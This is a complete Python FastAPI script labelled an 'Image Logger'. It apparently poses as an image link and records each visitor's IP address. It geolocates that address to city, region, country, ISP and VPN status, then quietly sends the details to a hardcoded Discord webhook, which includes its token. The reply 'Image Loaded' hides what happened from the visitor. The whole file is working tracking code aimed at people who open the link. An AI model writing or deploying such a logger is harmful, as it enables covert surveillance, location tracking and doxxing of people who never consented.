from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()

WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/")
async def log_request(request: Request):
    # This picks the true visitor IP
    forwarded = request.headers.get("x-forwarded-for")
    client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
    
    try:
        # IP Lookup
        resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,proxy,query").json()
        
        if resp.get("status") == "success":
            message = (
                f"**Image Logger - IP Logged**\n"
                f"**IP:** `{resp.get('query')}` | **ISP:** `{resp.get('isp')}`\n"
                f"**Location:** `{resp.get('city')}, {resp.get('regionName')}, {resp.get('country')}`\n"
                f"**VPN/Proxy:** `{resp.get('proxy')}`"
            )
            requests.post(WEBHOOK_URL, json={"content": message})
    except:
        pass

    return HTMLResponse(content="<h1>Image Loaded</h1>")
